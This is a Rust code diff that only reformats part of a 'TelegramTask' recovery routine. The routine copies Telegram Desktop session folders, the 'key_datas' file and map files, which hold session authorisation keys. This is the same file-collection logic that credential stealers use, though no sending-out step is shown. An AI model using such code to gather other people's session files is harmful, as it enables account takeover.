@@ -232,7 +232,14 @@ impl RecoveryTask for TelegramTask {
         let map_regex = Regex::new(r"^map[0-9]+$").unwrap();
         let session_folder_regex = Regex::new(r"^[A-F0-9]{16}$").unwrap();
 
-        let excluded_folders = ["user_data", "emoji", "temp", "dumps", "working", "thumbnails"];
+        let excluded_folders = [
+            "user_data",
+            "emoji",
+            "temp",
+            "dumps",
+            "working",
+            "thumbnails",
+        ];
 
         for root in &roots {
             if let Ok(mut dir) = fs::read_dir(root).await {
@@ -244,23 +251,23 @@ impl RecoveryTask for TelegramTask {
 
                     if is_dir {
                         if session_folder_regex.is_match(&name) {
-                            // Copy session folder but exclude large junk
                             copy_telegram_session_dir(
                                 &self.label(),
                                 &entry.path(),
                                 &dest_root.join(name.to_string()),
                                 &excluded_folders,
                                 &mut artifacts,
-                            ).await?;
+                            )
+                            .await?;
                         }
                     } else if is_file {
-                        let should_copy = name.len() == 17 
-                            || name == "key_datas" 
+                        let should_copy = name.len() == 17
+                            || name == "key_datas"
                             || name == "prefix"
                             || map_regex.is_match(&name);
 
                         if should_copy {
-                             copy_named_file(
+                            copy_named_file(
                                 &self.label(),
                                 &entry.path(),
                                 &dest_root,
